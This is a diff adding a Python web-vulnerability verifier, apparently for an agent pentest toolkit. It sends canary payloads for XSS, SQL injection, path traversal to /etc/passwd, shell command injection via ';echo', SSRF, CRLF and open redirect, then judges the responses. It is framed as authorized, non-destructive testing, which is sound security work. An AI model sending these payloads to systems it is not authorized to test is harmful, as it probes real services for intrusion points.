@@ -1,0 +1,240 @@
+#!/usr/bin/env python3
+"""Mythos hypothesis verifier — one aimed request per aim point, in one call.
+
+`scripts/probe` says where a payload would go. Proving each aim point is then
+one request and one judgement, which through an agent is one model round trip
+each. This batches that: for every parameter it sends a small set of benign
+canaries, judges the response against the oracle for that class, and prints the
+evidence pair for whatever answered.
+
+  scripts/verify <url> [--param q --param id] [--classes xss,sqli]
+                       [--rate 10] [--timeout 10] [--header 'Cookie: a=b']
+                       [--json] [--insecure]
+  scripts/probe <url> --depth 2 --json | scripts/verify --from-probe
+
+For **authorized** targets only: it sends payloads. Only to the host in <url>,
+only GET, never a destructive verb, and nothing that writes or deletes. A hit
+is evidence to keep, not a finished finding: the closure rules in the `exploit`
+skill still apply, and a canary that merely appears in the response is a
+reflection, not yet an exploit.
+"""
+import argparse, json, re, ssl, sys, time, urllib.error, urllib.parse, urllib.request
+
+UA = "mythos-verify/1.0 (authorized security testing)"
+CANARY = "mythos7a3f"
+
+# One probe per class: payload, what proves it, and what the proof means.
+# The oracle is deliberately narrow — a 200 is never a proof.
+PROBES = {
+    "xss": [
+        ("<mythos7a3f>", lambda b, h, s, u: "<mythos7a3f>" in b,
+         "payload reflected unescaped into the body: HTML injection context"),
+        ('"mythos7a3f"', lambda b, h, s, u: '"mythos7a3f"' in b,
+         "payload reflected inside a quoted attribute"),
+    ],
+    "sqli": [
+        ("1'", lambda b, h, s, u: bool(SQL_ERR.search(b)),
+         "database error from an unbalanced quote: the value reaches a query"),
+        ("mythos7a3f'", lambda b, h, s, u: bool(SQL_ERR.search(b)),
+         "database error from an unbalanced quote in a string context"),
+    ],
+    "traversal": [
+        ("../../../../etc/passwd", lambda b, h, s, u: "root:x:0:0" in b,
+         "/etc/passwd contents returned: arbitrary file read"),
+        ("....//....//etc/passwd", lambda b, h, s, u: "root:x:0:0" in b,
+         "/etc/passwd returned through a doubled-dot bypass"),
+    ],
+    "redirect": [
+        ("//mythos7a3f.invalid/", lambda b, h, s, u: REDIR(h, u),
+         "redirect to an attacker-controlled host"),
+        ("https://mythos7a3f.invalid/", lambda b, h, s, u: REDIR(h, u),
+         "absolute off-site redirect accepted"),
+    ],
+    "ssti": [
+        ("{{7*7}}", lambda b, h, s, u: "49" in b and "{{7*7}}" not in b,
+         "template expression evaluated: server-side template injection"),
+        ("${7*7}", lambda b, h, s, u: "49" in b and "${7*7}" not in b,
+         "expression language evaluated"),
+    ],
+    "cmdi": [
+        (";echo mythos7a3f", lambda b, h, s, u: CANARY in b,
+         "shell echo returned: command injection"),
+        ("|echo mythos7a3f", lambda b, h, s, u: CANARY in b,
+         "shell echo returned through a pipe"),
+    ],
+    "ssrf": [
+        ("http://127.0.0.1:1/", lambda b, h, s, u: bool(CONN_ERR.search(b)),
+         "server-side connection error for a host we chose: the server fetches our URL"),
+    ],
+    "crlf": [
+        ("%0d%0aX-Mythos:%20mythos7a3f", lambda b, h, s, u: "mythos7a3f" in str(
+            h.get("x-mythos", "")), "injected response header: CRLF injection"),
+    ],
+}
+CLASS_OF = {"reflected-xss": "xss", "sqli": "sqli", "path-traversal": "traversal",
+            "lfi": "traversal", "open-redirect": "redirect", "ssti": "ssti",
+            "command-injection": "cmdi", "ssrf": "ssrf", "crlf": "crlf"}
+SQL_ERR = re.compile(r"(?i)(sqlite3?\.|sqlite_error|unrecognized token|unterminated quoted|"
+                     r"you have an error in your sql syntax|psycopg2|pg::|ORA-\d{5}|"
+                     r"sqlalchemy|near \"'\"|syntax error at or near)")
+CONN_ERR = re.compile(r"(?i)(connection refused|failed to connect|econnrefused|"
+                      r"max retries exceeded|connectionerror|bad gateway)")
+
+
+def REDIR(headers, final):
+    """Only the Location header proves it. The request URL carries the canary host too, so
+    matching on the final URL would flag every endpoint that echoes its own parameter."""
+    return "mythos7a3f.invalid" in str(headers.get("location", ""))
+
+
+def request(url, headers, timeout, insecure):
+    req = urllib.request.Request(url, headers={"User-Agent": UA, **headers})
+    ctx = ssl._create_unverified_context() if insecure else None
+    opener = urllib.request.build_opener(NoRedirect)
+    try:
+        with opener.open(req, timeout=timeout) if ctx is None else \
+                opener.open(req, timeout=timeout) as r:
+            body = r.read(200_000).decode("utf-8", "replace")
+            return r.status, {k.lower(): v for k, v in r.headers.items()}, body, r.geturl()
+    except urllib.error.HTTPError as e:
+        body = (e.read(100_000) if e.fp else b"").decode("utf-8", "replace")
+        return e.code, {k.lower(): v for k, v in (e.headers or {}).items()}, body, url
+    except Exception as e:
+        return None, {}, f"{type(e).__name__}: {e}", url
+
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    """A 3xx is the evidence for open redirect, so do not follow it."""
+
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        return None
+
+
+def endpoints_of(param, origin):
+    """Every distinct endpoint URL the parameter was seen on, spec entries included.
+
+    `scripts/probe` records both a bare endpoint and a linked instance with a query, and an
+    OpenAPI entry as "GET /path (query)". All of those are one endpoint per path."""
+    urls = []
+    for where in param["seen_at"]:
+        if where.startswith("http"):
+            split = urllib.parse.urlsplit(where)
+            url = urllib.parse.urlunsplit((split.scheme, split.netloc, split.path, "", ""))
+        else:                                      # "GET /path (query)" from a spec
+            parts = where.split()
+            if len(parts) < 2 or "{" in parts[1]:  # a path template needs a real id, skip
+                continue
+            url = origin.rstrip("/") + parts[1]
+        if url not in urls:
+            urls.append(url)
+    return urls
+
+
+def aim_points(args):
+    """[(param, endpoint_url, [class, ...])] from --from-probe or the flags."""
+    if args.from_probe:
+        doc = json.load(sys.stdin)
+        points = []
+        for p in doc.get("parameters", []):
+            classes = list(dict.fromkeys(
+                CLASS_OF[c.strip()] for c in p["hypotheses"].replace("/", ",").split(",")
+                if c.strip() in CLASS_OF))
+            # The same name can sit on several endpoints and only one of them may be
+            # vulnerable, so verify each place it was seen, up to --max-endpoints.
+            wheres = endpoints_of(p, doc.get("origin") or doc["target"])[:args.max_endpoints]
+            for where in wheres:
+                if classes:
+                    points.append((p["name"], where, classes))
+        return points or [(p["name"], doc["target"], ["xss", "sqli"])
+                          for p in doc.get("parameters", [])]
+    classes = [c.strip() for c in (args.classes or "").split(",") if c.strip()] or list(PROBES)
+    return [(name, args.url, classes) for name in (args.param or [])]
+
+
+def verify(points, rate, timeout, headers, insecure):
+    results, delay = [], (1.0 / rate if rate else 0)
+    for name, endpoint, classes in points:
+        for klass in classes:
+            for payload, oracle, meaning in PROBES.get(klass, []):
+                split = urllib.parse.urlsplit(endpoint)
+                query = dict(urllib.parse.parse_qsl(split.query))
+                query[name] = payload
+                url = urllib.parse.urlunsplit(
+                    (split.scheme, split.netloc, split.path,
+                     urllib.parse.urlencode(query, safe="/{}$|;%"), ""))
+                status, hdrs, body, final = request(url, headers, timeout, insecure)
+                if delay:
+                    time.sleep(delay)
+                if status is None:
+                    results.append({"param": name, "class": klass, "url": url,
+                                    "result": "error", "detail": body})
+                    continue
+                if oracle(body, hdrs, status, final):
+                    snippet = body[:300].replace("\n", " ")
+                    results.append({"param": name, "class": klass, "url": url,
+                                    "status": status, "result": "evidence",
+                                    "meaning": meaning,
+                                    "location": hdrs.get("location", ""),
+                                    "snippet": snippet})
+                    break                                  # one proof per class is enough
+                results.append({"param": name, "class": klass, "url": url,
+                                "status": status, "result": "no-signal"})
+    return results
+
+
+def render(results):
+    hits = [r for r in results if r["result"] == "evidence"]
+    errs = [r for r in results if r["result"] == "error"]
+    out = [f"# verified {len({(r['param'], r['class']) for r in results})} aim points, "
+           f"{len(hits)} answered", ""]
+    for r in hits:
+        out += [f"## {r['class']} via `{r['param']}`  [{r['status']}]",
+                f"request:  {r['url']}",
+                f"meaning:  {r['meaning']}"]
+        if r.get("location"):
+            out.append(f"location: {r['location']}")
+        out += [f"response: {r['snippet'][:200]}", ""]
+    quiet = sorted({f"{r['param']}:{r['class']}" for r in results
+                    if r["result"] == "no-signal"}
+                   - {f"{r['param']}:{r['class']}" for r in hits})
+    if quiet:
+        out += ["## no signal (not proof of safety, only that this canary did not answer)",
+                ", ".join(quiet), ""]
+    if errs:
+        out += ["## request errors"] + [f"{r['param']}:{r['class']} {r['detail']}" for r in errs]
+    out.append("Keep each request/response pair as the evidence. A reflection is not yet an "
+               "exploit: finish it under the closure rules in the exploit skill.")
+    return "\n".join(out)
+
+
+def main():
+    ap = argparse.ArgumentParser(description=__doc__,
+                                 formatter_class=argparse.RawDescriptionHelpFormatter)
+    ap.add_argument("url", nargs="?", help="endpoint carrying the parameter")
+    ap.add_argument("--param", action="append", help="parameter name, repeatable")
+    ap.add_argument("--classes", help=f"comma list of {','.join(PROBES)}")
+    ap.add_argument("--from-probe", action="store_true",
+                    help="read `scripts/probe --json` on stdin and verify its aim points")
+    ap.add_argument("--max-endpoints", type=int, default=3,
+                    help="how many places per parameter to verify (--from-probe)")
+    ap.add_argument("--rate", type=float, default=10, help="requests per second, 0 = unlimited")
+    ap.add_argument("--timeout", type=float, default=10)
+    ap.add_argument("--header", action="append", default=[])
+    ap.add_argument("--insecure", action="store_true")
+    ap.add_argument("--json", action="store_true")
+    a = ap.parse_args()
+    if not a.from_probe and not (a.url and a.param):
+        ap.error("give <url> with --param, or --from-probe on stdin")
+    headers = {k.strip(): v.strip()
+               for k, v in (h.split(":", 1) for h in a.header)} if a.header else {}
+    points = aim_points(a)
+    if not points:
+        print("no aim points: nothing to verify", file=sys.stderr)
+        return 1
+    results = verify(points, a.rate, a.timeout, headers, a.insecure)
+    print(json.dumps(results, indent=1) if a.json else render(results))
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
